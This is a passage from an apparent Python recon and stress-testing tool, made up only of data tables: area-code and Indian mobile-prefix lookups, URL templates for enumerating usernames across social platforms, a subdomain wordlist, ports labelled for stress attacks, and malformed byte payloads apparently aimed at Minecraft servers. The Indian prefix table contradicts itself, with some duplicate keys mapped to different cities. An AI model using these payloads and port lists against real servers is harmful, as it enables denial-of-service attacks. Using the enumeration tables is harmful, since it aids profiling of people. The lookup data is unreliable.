    "541": ("Eugene", "OR", "Pacific"), "551": ("Jersey City", "NJ", "Eastern"),
    "559": ("Fresno", "CA", "Pacific"), "561": ("West Palm Beach", "FL", "Eastern"),
    "562": ("Long Beach", "CA", "Pacific"), "570": ("Scranton", "PA", "Eastern"),
    "571": ("Arlington", "VA", "Eastern"), "585": ("Rochester", "NY", "Eastern"),
    "586": ("Warren", "MI", "Eastern"), "602": ("Phoenix", "AZ", "Mountain"),
    "603": ("Manchester", "NH", "Eastern"), "605": ("Sioux Falls", "SD", "Central"),
    "606": ("Ashland", "KY", "Eastern"), "607": ("Binghamton", "NY", "Eastern"),
    "608": ("Madison", "WI", "Central"), "609": ("Trenton", "NJ", "Eastern"),
    "610": ("Allentown", "PA", "Eastern"), "612": ("Minneapolis", "MN", "Central"),
    "614": ("Columbus", "OH", "Eastern"), "615": ("Nashville", "TN", "Central"),
    "616": ("Grand Rapids", "MI", "Eastern"), "617": ("Boston", "MA", "Eastern"),
    "618": ("Belleville", "IL", "Central"), "619": ("San Diego", "CA", "Pacific"),
    "626": ("Pasadena", "CA", "Pacific"), "630": ("Naperville", "IL", "Central"),
    "631": ("Ronkonkoma", "NY", "Eastern"), "646": ("Manhattan", "NY", "Eastern"),
    "647": ("Toronto", "ON", "Eastern"), "650": ("Palo Alto", "CA", "Pacific"),
    "651": ("St. Paul", "MN", "Central"), "660": ("Sedalia", "MO", "Central"),
    "661": ("Bakersfield", "CA", "Pacific"), "662": ("Tupelo", "MS", "Central"),
    "669": ("San Jose", "CA", "Pacific"), "678": ("Atlanta", "GA", "Eastern"),
    "682": ("Fort Worth", "TX", "Central"), "701": ("Fargo", "ND", "Central"),
    "702": ("Las Vegas", "NV", "Pacific"), "703": ("Arlington", "VA", "Eastern"),
    "704": ("Charlotte", "NC", "Eastern"), "706": ("Augusta", "GA", "Eastern"),
    "707": ("Santa Rosa", "CA", "Pacific"), "708": ("Oak Lawn", "IL", "Central"),
    "712": ("Sioux City", "IA", "Central"), "713": ("Houston", "TX", "Central"),
    "714": ("Anaheim", "CA", "Pacific"), "715": ("Wausau", "WI", "Central"),
    "716": ("Buffalo", "NY", "Eastern"), "717": ("Harrisburg", "PA", "Eastern"),
    "718": ("Brooklyn", "NY", "Eastern"), "719": ("Colorado Springs", "CO", "Mountain"),
    "720": ("Denver", "CO", "Mountain"), "724": ("New Kensington", "PA", "Eastern"),
    "727": ("St. Petersburg", "FL", "Eastern"), "731": ("Jackson", "TN", "Central"),
    "732": ("New Brunswick", "NJ", "Eastern"), "734": ("Ann Arbor", "MI", "Eastern"),
    "740": ("Zanesville", "OH", "Eastern"), "747": ("Los Angeles", "CA", "Pacific"),
    "754": ("Fort Lauderdale", "FL", "Eastern"), "757": ("Virginia Beach", "VA", "Eastern"),
    "760": ("Palm Springs", "CA", "Pacific"), "762": ("Augusta", "GA", "Eastern"),
    "763": ("Minneapolis", "MN", "Central"), "765": ("Lafayette", "IN", "Eastern"),
    "770": ("Marietta", "GA", "Eastern"), "772": ("Fort Pierce", "FL", "Eastern"),
    "773": ("Chicago", "IL", "Central"), "774": ("New Bedford", "MA", "Eastern"),
    "775": ("Reno", "NV", "Pacific"), "781": ("Boston", "MA", "Eastern"),
    "785": ("Topeka", "KS", "Central"), "786": ("Miami", "FL", "Eastern"),
    "787": ("San Juan", "PR", "Atlantic"), "801": ("Salt Lake City", "UT", "Mountain"),
    "802": ("Burlington", "VT", "Eastern"), "803": ("Columbia", "SC", "Eastern"),
    "804": ("Richmond", "VA", "Eastern"), "805": ("Santa Barbara", "CA", "Pacific"),
    "806": ("Amarillo", "TX", "Central"), "808": ("Honolulu", "HI", "Pacific"),
    "810": ("Flint", "MI", "Eastern"), "812": ("Evansville", "IN", "Eastern"),
    "813": ("Tampa", "FL", "Eastern"), "814": ("Erie", "PA", "Eastern"),
    "815": ("Rockford", "IL", "Central"), "816": ("Kansas City", "MO", "Central"),
    "817": ("Fort Worth", "TX", "Central"), "818": ("Los Angeles", "CA", "Pacific"),
    "828": ("Asheville", "NC", "Eastern"), "830": ("New Braunfels", "TX", "Central"),
    "831": ("Monterey", "CA", "Pacific"), "832": ("Houston", "TX", "Central"),
    "843": ("Charleston", "SC", "Eastern"), "845": ("New City", "NY", "Eastern"),
    "847": ("Evanston", "IL", "Central"), "848": ("New Brunswick", "NJ", "Eastern"),
    "850": ("Tallahassee", "FL", "Eastern"), "856": ("Camden", "NJ", "Eastern"),
    "857": ("Boston", "MA", "Eastern"), "858": ("San Diego", "CA", "Pacific"),
    "859": ("Lexington", "KY", "Eastern"), "860": ("Hartford", "CT", "Eastern"),
    "862": ("Newark", "NJ", "Eastern"), "863": ("Lakeland", "FL", "Eastern"),
    "864": ("Greenville", "SC", "Eastern"), "865": ("Knoxville", "TN", "Eastern"),
    "870": ("Jonesboro", "AR", "Central"), "901": ("Memphis", "TN", "Central"),
    "902": ("Halifax", "NS", "Atlantic"), "903": ("Tyler", "TX", "Central"),
    "904": ("Jacksonville", "FL", "Eastern"), "905": ("Mississauga", "ON", "Eastern"),
    "906": ("Marquette", "MI", "Eastern"), "907": ("Anchorage", "AK", "Alaska"),
    "908": ("Elizabeth", "NJ", "Eastern"), "909": ("San Bernardino", "CA", "Pacific"),
    "910": ("Wilmington", "NC", "Eastern"), "912": ("Savannah", "GA", "Eastern"),
    "913": ("Kansas City", "KS", "Central"), "914": ("White Plains", "NY", "Eastern"),
    "915": ("El Paso", "TX", "Mountain"), "916": ("Sacramento", "CA", "Pacific"),
    "917": ("New York City", "NY", "Eastern"), "918": ("Tulsa", "OK", "Central"),
    "919": ("Raleigh", "NC", "Eastern"), "920": ("Green Bay", "WI", "Central"),
    "925": ("Concord", "CA", "Pacific"), "928": ("Flagstaff", "AZ", "Mountain"),
    "929": ("New York City", "NY", "Eastern"), "931": ("Clarksville", "TN", "Central"),
    "936": ("Huntsville", "TX", "Central"), "937": ("Dayton", "OH", "Eastern"),
    "940": ("Wichita Falls", "TX", "Central"), "941": ("Sarasota", "FL", "Eastern"),
    "947": ("Farmington Hills", "MI", "Eastern"), "949": ("Irvine", "CA", "Pacific"),
    "951": ("Riverside", "CA", "Pacific"), "952": ("Bloomington", "MN", "Central"),
    "954": ("Fort Lauderdale", "FL", "Eastern"), "956": ("Laredo", "TX", "Central"),
    "959": ("Hartford", "CT", "Eastern"), "970": ("Fort Collins", "CO", "Mountain"),
    "971": ("Portland", "OR", "Pacific"), "972": ("Irving", "TX", "Central"),
    "973": ("Newark", "NJ", "Eastern"), "978": ("Lowell", "MA", "Eastern"),
    "979": ("Bryan", "TX", "Central"), "980": ("Charlotte", "NC", "Eastern"),
    "984": ("Raleigh", "NC", "Eastern"), "985": ("Hammond", "LA", "Central"),
}

SOCIAL_PLATFORMS = {
    "GitHub": ("https://github.com/{}", "user not found"),
    "Twitter/X": ("https://x.com/{}", "this account doesn"),
    "Instagram": ("https://www.instagram.com/{}/", "page isn't available"),
    "Reddit": ("https://www.reddit.com/user/{}", "page not found"),
    "YouTube": ("https://www.youtube.com/@{}/videos", "page not found"),
    "LinkedIn": ("https://www.linkedin.com/in/{}", "page not found"),
    "Pinterest": ("https://www.pinterest.com/{}/", "not found"),
    "TikTok": ("https://www.tiktok.com/@{}", "couldn't find this account"),
    "Snapchat": ("https://www.snapchat.com/add/{}", "couldn't find"),
    "Telegram": ("https://t.me/{}", "Sorry, this chat"),
    "Medium": ("https://medium.com/@{}", "page not found"),
    "Dev.to": ("https://dev.to/{}", "page not found"),
    "Twitch": ("https://www.twitch.tv/{}", "page not found"),
    "Facebook": ("https://www.facebook.com/{}/", "page not found"),
    "Tumblr": ("https://{}.tumblr.com", "there's nothing here"),
    "Patreon": ("https://www.patreon.com/{}", "page not found"),
    "Keybase": ("https://keybase.io/{}", "not found"),
    "About.me": ("https://about.me/{}", "not found"),
    "Behance": ("https://www.behance.net/{}", "page not found"),
    "Dribbble": ("https://dribbble.com/{}", "page not found"),
    "Flickr": ("https://www.flickr.com/people/{}/", "not found"),
    "Vimeo": ("https://vimeo.com/{}", "page not found"),
    "SoundCloud": ("https://soundcloud.com/{}", "page not found"),
    "Bandcamp": ("https://{}.bandcamp.com", "page not found"),
    "Replit": ("https://replit.com/@{}", "page not found"),
    "Codepen": ("https://codepen.io/{}", "page not found"),
    "HackerNews": ("https://news.ycombinator.com/user?id={}", "No such user"),
    "ProductHunt": ("https://www.producthunt.com/@{}", "page not found"),
    "BitBucket": ("https://bitbucket.org/{}/", "page not found"),
    "GitLab": ("https://gitlab.com/{}", "page not found"),
    "Steam": ("https://steamcommunity.com/id/{}/", "The specified profile could not be found"),
    "Spotify": ("https://open.spotify.com/user/{}", "page not found"),
    "Last.fm": ("https://www.last.fm/user/{}", "page not found"),
    "Fiverr": ("https://www.fiverr.com/{}", "page not found"),
    "GoodReads": ("https://www.goodreads.com/{}", "page not found"),
    "Wikipedia": ("https://en.wikipedia.org/wiki/User:{}", "page not found"),
    "Etsy": ("https://www.etsy.com/shop/{}", "page not found"),
    "HackerOne": ("https://hackerone.com/{}", "not found"),
    "Bugcrowd": ("https://bugcrowd.com/{}", "page not found"),
}

SUBDOMAIN_WORDLIST = [
    "www","mail","ftp","admin","api","dev","test","staging","blog","cdn","static",
    "assets","img","css","js","download","support","help","docs","wiki","forum",
    "shop","store","app","mobile","webmail","cpanel","whm","ns1","ns2","smtp",
    "pop","imap","mx","calendar","drive","cloud","git","jenkins","jira","confluence",
    "redis","mongo","mysql","db","database","backup","monitor","status","analytics",
    "tracking","live","stream","news","info","about","contact","careers","jobs",
    "portal","my","client","clients","login","register","account","billing","payment",
    "orders","cart","checkout","ssl","secure","vpn","proxy","gateway","firewall",
    "docker","k8s","kubernetes","swarm","gitlab","bitbucket","svn","bugzilla",
    "demo","example","beta","alpha","prod","production","qa","quality","survey",
    "sso","auth","oauth","ldap","saml","idp","okta",
]
SUBDOMAIN_WORDLIST = list(dict.fromkeys(SUBDOMAIN_WORDLIST))

MINECRAFT_PORTS = [25565, 25566, 25575, 19132, 19133]
STRESS_PORTS = [22, 80, 443, 8080, 8443, 3306, 5432, 6379, 27017, 9200, 5601, 9090, 3000, 8000, 8888]
MINECRAFT_PAYLOADS = [
    b"\x00\xff\xff\xff\xff\x01\x00", b"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff",
    b"\xfe\x01\x00", b"\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
    b"\x00" * 64, b"\xff" * 128,
]

TOLLFREE_PREFIXES = ["800", "833", "844", "855", "866", "877", "888"]

INDIAN_NDC = {
    "9810": ("New Delhi", "Delhi", "Delhi NCR"), "9811": ("New Delhi", "Delhi", "Delhi NCR"),
    "9818": ("New Delhi", "Delhi", "Delhi NCR"), "9819": ("New Delhi", "Delhi", "Delhi NCR"),
    "9868": ("New Delhi", "Delhi", "Delhi NCR"), "9871": ("New Delhi", "Delhi", "Delhi NCR"),
    "9873": ("New Delhi", "Delhi", "Delhi NCR"), "9874": ("New Delhi", "Delhi", "Delhi NCR"),
    "9910": ("New Delhi", "Delhi", "Delhi NCR"), "9911": ("New Delhi", "Delhi", "Delhi NCR"),
    "9958": ("New Delhi", "Delhi", "Delhi NCR"), "9968": ("New Delhi", "Delhi", "Delhi NCR"),
    "9971": ("New Delhi", "Delhi", "Delhi NCR"),
    "9820": ("Mumbai", "Maharashtra", "Mumbai"), "9821": ("Mumbai", "Maharashtra", "Mumbai"),
    "9833": ("Mumbai", "Maharashtra", "Mumbai"), "9867": ("Mumbai", "Maharashtra", "Mumbai"),
    "9869": ("Mumbai", "Maharashtra", "Mumbai"), "9870": ("Mumbai", "Maharashtra", "Mumbai"),
    "9920": ("Mumbai", "Maharashtra", "Mumbai"), "9930": ("Mumbai", "Maharashtra", "Mumbai"),
    "9987": ("Mumbai", "Maharashtra", "Mumbai"),
    "9830": ("Kolkata", "West Bengal", "Kolkata"), "9831": ("Kolkata", "West Bengal", "Kolkata"),
    "9836": ("Kolkata", "West Bengal", "Kolkata"), "9874": ("Kolkata", "West Bengal", "Kolkata"),
    "9875": ("Kolkata", "West Bengal", "Kolkata"), "9903": ("Kolkata", "West Bengal", "Kolkata"),
    "9932": ("Kolkata", "West Bengal", "Kolkata"), "9986": ("Kolkata", "West Bengal", "Kolkata"),
    "9840": ("Chennai", "Tamil Nadu", "Chennai"), "9841": ("Chennai", "Tamil Nadu", "Chennai"),
    "9884": ("Chennai", "Tamil Nadu", "Chennai"), "9886": ("Chennai", "Tamil Nadu", "Chennai"),
    "9887": ("Chennai", "Tamil Nadu", "Chennai"), "9940": ("Chennai", "Tamil Nadu", "Chennai"),
    "9962": ("Chennai", "Tamil Nadu", "Chennai"),
    "9845": ("Bangalore", "Karnataka", "Bangalore"), "9844": ("Bangalore", "Karnataka", "Bangalore"),
    "9880": ("Bangalore", "Karnataka", "Bangalore"), "9900": ("Bangalore", "Karnataka", "Bangalore"),
    "9945": ("Bangalore", "Karnataka", "Bangalore"), "9980": ("Bangalore", "Karnataka", "Bangalore"),
    "9848": ("Hyderabad", "Telangana", "Hyderabad"), "9849": ("Hyderabad", "Telangana", "Hyderabad"),
    "9885": ("Hyderabad", "Telangana", "Hyderabad"), "9908": ("Hyderabad", "Telangana", "Hyderabad"),
    "9948": ("Hyderabad", "Telangana", "Hyderabad"), "9949": ("Hyderabad", "Telangana", "Hyderabad"),
    "9989": ("Hyderabad", "Telangana", "Hyderabad"),
    "9825": ("Ahmedabad", "Gujarat", "Gujarat"), "9824": ("Ahmedabad", "Gujarat", "Gujarat"),
    "9879": ("Ahmedabad", "Gujarat", "Gujarat"), "9925": ("Ahmedabad", "Gujarat", "Gujarat"),
    "9978": ("Ahmedabad", "Gujarat", "Gujarat"), "9998": ("Ahmedabad", "Gujarat", "Gujarat"),
    "9822": ("Pune", "Maharashtra", "Pune"), "9850": ("Pune", "Maharashtra", "Pune"),
    "9881": ("Pune", "Maharashtra", "Pune"), "9970": ("Pune", "Maharashtra", "Pune"),
    "9922": ("Pune", "Maharashtra", "Pune"), "9923": ("Pune", "Maharashtra", "Pune"),
    "9829": ("Jaipur", "Rajasthan", "Rajasthan"), "9928": ("Jaipur", "Rajasthan", "Rajasthan"),
    "9950": ("Jaipur", "Rajasthan", "Rajasthan"), "9982": ("Jaipur", "Rajasthan", "Rajasthan"),
    "9983": ("Jaipur", "Rajasthan", "Rajasthan"),
    "9815": ("Chandigarh", "Chandigarh", "Chandigarh"), "9872": ("Chandigarh", "Chandigarh", "Chandigarh"),
    "9888": ("Chandigarh", "Chandigarh", "Chandigarh"), "9988": ("Chandigarh", "Chandigarh", "Chandigarh"),
    "9838": ("Lucknow", "Uttar Pradesh", "UP East"), "9839": ("Lucknow", "Uttar Pradesh", "UP East"),
    "9935": ("Lucknow", "Uttar Pradesh", "UP East"), "9984": ("Lucknow", "Uttar Pradesh", "UP East"),
    "9450": ("Lucknow", "Uttar Pradesh", "UP East"),
    "9835": ("Patna", "Bihar", "Bihar"), "9931": ("Patna", "Bihar", "Bihar"),
    "9934": ("Patna", "Bihar", "Bihar"), "9973": ("Bihar", "Bihar", "Bihar"),
    "9893": ("Bhopal", "Madhya Pradesh", "MP"), "9892": ("Bhopal", "Madhya Pradesh", "MP"),
    "9993": ("Bhopal", "Madhya Pradesh", "MP"), "9826": ("Indore", "Madhya Pradesh", "MP"),
    "9827": ("Indore", "Madhya Pradesh", "MP"),
    "9414": ("Lucknow", "Uttar Pradesh", "UP"), "9415": ("Lucknow", "Uttar Pradesh", "UP"),
    "9416": ("Agra", "Uttar Pradesh", "UP"), "9417": ("Varanasi", "Uttar Pradesh", "UP"),
    "9418": ("Kanpur", "Uttar Pradesh", "UP"), "9419": ("Allahabad", "Uttar Pradesh", "UP"),
    "9422": ("Nagpur", "Maharashtra", "Vidarbha"), "9423": ("Nagpur", "Maharashtra", "Vidarbha"),
    "9424": ("Nagpur", "Maharashtra", "Vidarbha"),
    "9425": ("Aurangabad", "Maharashtra", "Marathwada"),
    "9426": ("Nashik", "Maharashtra", "North Maharashtra"),
    "9427": ("Kolhapur", "Maharashtra", "West Maharashtra"),
    "9428": ("Amravati", "Maharashtra", "Vidarbha"),
    "9431": ("Guwahati", "Assam", "Assam"), "9435": ("Guwahati", "Assam", "Assam"),
    "9437": ("Shillong", "Meghalaya", "NE"),
    "9438": ("Imphal", "Manipur", "NE"),
    "9439": ("Agartala", "Tripura", "NE"),
    "9440": ("Kochi", "Kerala", "Kerala"), "9446": ("Kochi", "Kerala", "Kerala"),
    "9447": ("Thiruvananthapuram", "Kerala", "Kerala"),
    "9448": ("Kozhikode", "Kerala", "Kerala"),
    "9450": ("Varanasi", "Uttar Pradesh", "UP East"),
    "9451": ("Gorakhpur", "Uttar Pradesh", "UP East"),
    "9452": ("Faizabad", "Uttar Pradesh", "UP East"),
    "9453": ("Jhansi", "Uttar Pradesh", "UP"),
    "9455": ("Moradabad", "Uttar Pradesh", "UP West"),
    "9460": ("Ganganagar", "Rajasthan", "Rajasthan"),
    "9461": ("Bikaner", "Rajasthan", "Rajasthan"),
    "9462": ("Jodhpur", "Rajasthan", "Rajasthan"),
    "9464": ("Ajmer", "Rajasthan", "Rajasthan"),
    "9465": ("Kota", "Rajasthan", "Rajasthan"),
    "9479": ("Ranchi", "Jharkhand", "Jharkhand"),
    "9480": ("Bangalore", "Karnataka", "Bangalore"),
    "9481": ("Mysore", "Karnataka", "Karnataka"),
    "9482": ("Mangalore", "Karnataka", "Karnataka"),
    "9483": ("Hubli", "Karnataka", "Karnataka"),
    "9484": ("Belgaum", "Karnataka", "Karnataka"),
    "9490": ("Vijayawada", "Andhra Pradesh", "AP"),
    "9491": ("Visakhapatnam", "Andhra Pradesh", "AP"),
    "9492": ("Guntur", "Andhra Pradesh", "AP"),
    "9493": ("Tirupati", "Andhra Pradesh", "AP"),
    "9494": ("Kurnool", "Andhra Pradesh", "AP"),
    "9495": ("Warangal", "Telangana", "Telangana"),
    "9496": ("Kakinada", "Andhra Pradesh", "AP"),
    "9497": ("Rajahmundry", "Andhra Pradesh", "AP"),
    "9498": ("Nellore", "Andhra Pradesh", "AP"),
    "9500": ("Chandigarh", "Chandigarh", "Chandigarh"),
    "9501": ("Ludhiana", "Punjab", "Punjab"),
    "9502": ("Jalandhar", "Punjab", "Punjab"),
    "9503": ("Amritsar", "Punjab", "Punjab"),
    "9504": ("Bathinda", "Punjab", "Punjab"),
    "9505": ("Patiala", "Punjab", "Punjab"),
    "9510": ("Mohan", "Himachal Pradesh", "HP"),
    "9533": ("Shimla", "Himachal Pradesh", "HP"),
    "9535": ("Jammu", "Jammu & Kashmir", "J&K"),
    "9541": ("Dehradun", "Uttarakhand", "Uttarakhand"),
    "9542": ("Haridwar", "Uttarakhand", "Uttarakhand"),
    "9550": ("Lucknow", "Uttar Pradesh", "UP"),
    "9551": ("Kanpur", "Uttar Pradesh", "UP"),
    "9552": ("Allahabad", "Uttar Pradesh", "UP"),
    "9553": ("Varanasi", "Uttar Pradesh", "UP"),
    "9554": ("Agra", "Uttar Pradesh", "UP"),
    "9555": ("Aligarh", "Uttar Pradesh", "UP"),
    "9560": ("Kozhikode", "Kerala", "Kerala"),
    "9561": ("Kochi", "Kerala", "Kerala"),
    "9562": ("Thrissur", "Kerala", "Kerala"),
    "9563": ("Thiruvananthapuram", "Kerala", "Kerala"),
    "9564": ("Kollam", "Kerala", "Kerala"),
    "9565": ("Kannur", "Kerala", "Kerala"),
    "9570": ("Tirunelveli", "Tamil Nadu", "Tamil Nadu"),
    "9571": ("Madurai", "Tamil Nadu", "Tamil Nadu"),
    "9572": ("Coimbatore", "Tamil Nadu", "Tamil Nadu"),
    "9573": ("Salem", "Tamil Nadu", "Tamil Nadu"),
    "9574": ("Trichy", "Tamil Nadu", "Tamil Nadu"),
    "9575": ("Vellore", "Tamil Nadu", "Tamil Nadu"),
    "9580": ("Jammu", "Jammu & Kashmir", "J&K"),
    "9581": ("Srinagar", "Jammu & Kashmir", "J&K"),
    "9590": ("Srinagar", "Jammu & Kashmir", "J&K"),
    "9591": ("Anantnag", "Jammu & Kashmir", "J&K"),
    "9592": ("Baramulla", "Jammu & Kashmir", "J&K"),
    "9593": ("Jammu", "Jammu & Kashmir", "J&K"),
    "9596": ("Shimla", "Himachal Pradesh", "HP"),
    "9597": ("Dharamshala", "Himachal Pradesh", "HP"),
    "9598": ("Solan", "Himachal Pradesh", "HP"),
    "9600": ("Ludhiana", "Punjab", "Punjab"),
    "9601": ("Jalandhar", "Punjab", "Punjab"),
    "9602": ("Amritsar", "Punjab", "Punjab"),
    "9603": ("Bathinda", "Punjab", "Punjab"),
    "9604": ("Patiala", "Punjab", "Punjab"),
    "9605": ("Mohali", "Punjab", "Punjab"),
    "9610": ("Jaipur", "Rajasthan", "Rajasthan"),
    "9611": ("Jodhpur", "Rajasthan", "Rajasthan"),
    "9612": ("Kota", "Rajasthan", "Rajasthan"),
    "9613": ("Bikaner", "Rajasthan", "Rajasthan"),
    "9614": ("Udaipur", "Rajasthan", "Rajasthan"),
    "9620": ("Bangalore", "Karnataka", "Bangalore"),
    "9621": ("Mysore", "Karnataka", "Karnataka"),
    "9622": ("Mangalore", "Karnataka", "Karnataka"),
    "9623": ("Hubli", "Karnataka", "Karnataka"),
    "9624": ("Belgaum", "Karnataka", "Karnataka"),
    "9625": ("Gulbarga", "Karnataka", "Karnataka"),
    "9630": ("Mumbai", "Maharashtra", "Mumbai"),
    "9631": ("Pune", "Maharashtra", "Pune"),
    "9632": ("Nagpur", "Maharashtra", "Vidarbha"),
    "9633": ("Nashik", "Maharashtra", "North Maharashtra"),
    "9634": ("Aurangabad", "Maharashtra", "Marathwada"),
    "9635": ("Kolhapur", "Maharashtra", "West Maharashtra"),
    "9640": ("Hyderabad", "Telangana", "Hyderabad"),
    "9641": ("Warangal", "Telangana", "Telangana"),
    "9642": ("Nizamabad", "Telangana", "Telangana"),
    "9643": ("Khammam", "Telangana", "Telangana"),
    "9650": ("Chennai", "Tamil Nadu", "Chennai"),
    "9651": ("Coimbatore", "Tamil Nadu", "Tamil Nadu"),
    "9652": ("Madurai", "Tamil Nadu", "Tamil Nadu"),
    "9653": ("Trichy", "Tamil Nadu", "Tamil Nadu"),
    "9654": ("Salem", "Tamil Nadu", "Tamil Nadu"),
    "9655": ("Tirunelveli", "Tamil Nadu", "Tamil Nadu"),
    "9660": ("Ahmedabad", "Gujarat", "Gujarat"),
    "9661": ("Vadodara", "Gujarat", "Gujarat"),
    "9662": ("Surat", "Gujarat", "Gujarat"),
    "9663": ("Rajkot", "Gujarat", "Gujarat"),
    "9664": ("Bhavnagar", "Gujarat", "Gujarat"),
    "9670": ("Kolkata", "West Bengal", "Kolkata"),
    "9671": ("Siliguri", "West Bengal", "West Bengal"),
    "9672": ("Durgapur", "West Bengal", "West Bengal"),
    "9673": ("Asansol", "West Bengal", "West Bengal"),
    "9674": ("Burdwan", "West Bengal", "West Bengal"),
    "9680": ("Guwahati", "Assam", "Assam"),
    "9681": ("Silchar", "Assam", "Assam"),
    "9685": ("Shillong", "Meghalaya", "NE"),
    "9686": ("Imphal", "Manipur", "NE"),
    "9689": ("Agartala", "Tripura", "NE"),
    "9690": ("Raipur", "Chhattisgarh", "CG"),
    "9691": ("Bhilai", "Chhattisgarh", "CG"),
    "9692": ("Bilaspur", "Chhattisgarh", "CG"),
    "9693": ("Jagdalpur", "Chhattisgarh", "CG"),
    "9700": ("Hyderabad", "Telangana", "Hyderabad"),
    "9701": ("Hyderabad", "Telangana", "Hyderabad"),
    "9702": ("Warangal", "Telangana", "Telangana"),
    "9703": ("Nizamabad", "Telangana", "Telangana"),
    "9704": ("Khammam", "Telangana", "Telangana"),
    "9705": ("Karimnagar", "Telangana", "Telangana"),
    "9711": ("Delhi", "Delhi", "Delhi NCR"),
    "9712": ("Delhi", "Delhi", "Delhi NCR"),
    "9713": ("Delhi", "Delhi", "Delhi NCR"),
    "9714": ("Delhi", "Delhi", "Delhi NCR"),
    "9715": ("Delhi", "Delhi", "Delhi NCR"),
    "9716": ("Delhi", "Delhi", "Delhi NCR"),
    "9717": ("Delhi", "Delhi", "Delhi NCR"),
    "9718": ("Delhi", "Delhi", "Delhi NCR"),
    "9719": ("Delhi", "Delhi", "Delhi NCR"),
    "9720": ("Ahmedabad", "Gujarat", "Gujarat"),
    "9721": ("Vadodara", "Gujarat", "Gujarat"),
    "9722": ("Surat", "Gujarat", "Gujarat"),
    "9723": ("Rajkot", "Gujarat", "Gujarat"),
    "9724": ("Bhavnagar", "Gujarat", "Gujarat"),
    "9725": ("Jamnagar", "Gujarat", "Gujarat"),
    "9726": ("Junagadh", "Gujarat", "Gujarat"),
    "9727": ("Anand", "Gujarat", "Gujarat"),
    "9728": ("Nadiad", "Gujarat", "Gujarat"),
    "9729": ("Gandhinagar", "Gujarat", "Gujarat"),
    "9730": ("Bangalore", "Karnataka", "Bangalore"),
    "9731": ("Bangalore", "Karnataka", "Bangalore"),
    "9732": ("Bangalore", "Karnataka", "Bangalore"),
    "9733": ("Bangalore", "Karnataka", "Bangalore"),
    "9734": ("Mysore", "Karnataka", "Karnataka"),
    "9735": ("Mangalore", "Karnataka", "Karnataka"),
    "9736": ("Hubli", "Karnataka", "Karnataka"),
    "9737": ("Belgaum", "Karnataka", "Karnataka"),
    "9738": ("Gulbarga", "Karnataka", "Karnataka"),
    "9739": ("Bellary", "Karnataka", "Karnataka"),
    "9740": ("Kochi", "Kerala", "Kerala"),
    "9741": ("Kochi", "Kerala", "Kerala"),
    "9742": ("Thrissur", "Kerala", "Kerala"),
    "9743": ("Thiruvananthapuram", "Kerala", "Kerala"),
    "9744": ("Kozhikode", "Kerala", "Kerala"),
    "9745": ("Kollam", "Kerala", "Kerala"),
    "9746": ("Kannur", "Kerala", "Kerala"),
    "9747": ("Alappuzha", "Kerala", "Kerala"),
    "9748": ("Palakkad", "Kerala", "Kerala"),
    "9749": ("Malappuram", "Kerala", "Kerala"),
    "9750": ("Bhopal", "Madhya Pradesh", "MP"),
    "9751": ("Indore", "Madhya Pradesh", "MP"),
    "9752": ("Gwalior", "Madhya Pradesh", "MP"),
    "9753": ("Jabalpur", "Madhya Pradesh", "MP"),
    "9754": ("Ujjain", "Madhya Pradesh", "MP"),
    "9755": ("Sagar", "Madhya Pradesh", "MP"),
    "9756": ("Rewa", "Madhya Pradesh", "MP"),
    "9757": ("Satna", "Madhya Pradesh", "MP"),
    "9758": ("Ratlam", "Madhya Pradesh", "MP"),
    "9759": ("Mandsaur", "Madhya Pradesh", "MP"),
    "9760": ("Mumbai", "Maharashtra", "Mumbai"),
    "9761": ("Mumbai", "Maharashtra", "Mumbai"),
    "9762": ("Mumbai", "Maharashtra", "Mumbai"),
    "9763": ("Mumbai", "Maharashtra", "Mumbai"),
    "9764": ("Pune", "Maharashtra", "Pune"),
    "9765": ("Pune", "Maharashtra", "Pune"),
    "9766": ("Nagpur", "Maharashtra", "Vidarbha"),
    "9767": ("Nashik", "Maharashtra", "North Maharashtra"),
    "9768": ("Aurangabad", "Maharashtra", "Marathwada"),
    "9769": ("Kolhapur", "Maharashtra", "West Maharashtra"),
    "9770": ("Chandigarh", "Chandigarh", "Chandigarh"),
    "9771": ("Chandigarh", "Chandigarh", "Chandigarh"),
    "9772": ("Ludhiana", "Punjab", "Punjab"),
    "9773": ("Jalandhar", "Punjab", "Punjab"),
    "9774": ("Amritsar", "Punjab", "Punjab"),
    "9775": ("Bathinda", "Punjab", "Punjab"),
    "9776": ("Patiala", "Punjab", "Punjab"),
    "9777": ("Mohali", "Punjab", "Punjab"),
    "9778": ("Patiala", "Punjab", "Punjab"),
    "9779": ("Ludhiana", "Punjab", "Punjab"),
    "9780": ("Jaipur", "Rajasthan", "Rajasthan"),
    "9781": ("Jaipur", "Rajasthan", "Rajasthan"),
    "9782": ("Jodhpur", "Rajasthan", "Rajasthan"),
    "9783": ("Kota", "Rajasthan", "Rajasthan"),
    "9784": ("Bikaner", "Rajasthan", "Rajasthan"),
    "9785": ("Udaipur", "Rajasthan", "Rajasthan"),
    "9786": ("Ajmer", "Rajasthan", "Rajasthan"),
    "9787": ("Bhilwara", "Rajasthan", "Rajasthan"),
    "9788": ("Alwar", "Rajasthan", "Rajasthan"),
    "9789": ("Sikar", "Rajasthan", "Rajasthan"),
    "9790": ("Patna", "Bihar", "Bihar"),
    "9791": ("Patna", "Bihar", "Bihar"),
    "9792": ("Gaya", "Bihar", "Bihar"),
    "9793": ("Muzaffarpur", "Bihar", "Bihar"),
    "9794": ("Bhagalpur", "Bihar", "Bihar"),
    "9795": ("Darbhanga", "Bihar", "Bihar"),
    "9796": ("Purnia", "Bihar", "Bihar"),
    "9797": ("Sasaram", "Bihar", "Bihar"),
    "9798": ("Chhapra", "Bihar", "Bihar"),
    "9799": ("Motihari", "Bihar", "Bihar"),
    "9800": ("Ranchi", "Jharkhand", "Jharkhand"),
    "9801": ("Jamshedpur", "Jharkhand", "Jharkhand"),
    "9802": ("Dhanbad", "Jharkhand", "Jharkhand"),
    "9803": ("Bokaro", "Jharkhand", "Jharkhand"),
    "9812": ("Dehradun", "Uttarakhand", "Uttarakhand"),
    "9813": ("Haridwar", "Uttarakhand", "Uttarakhand"),
    "9837": ("Dehradun", "Uttarakhand", "Uttarakhand"),
    "9842": ("Chennai", "Tamil Nadu", "Chennai"),
    "9843": ("Chennai", "Tamil Nadu", "Chennai"),
    "9846": ("Bangalore", "Karnataka", "Bangalore"),
    "9847": ("Bangalore", "Karnataka", "Bangalore"),
    "9860": ("Guwahati", "Assam", "Assam"),
    "9862": ("Shillong", "Meghalaya", "NE"),
    "9863": ("Imphal", "Manipur", "NE"),
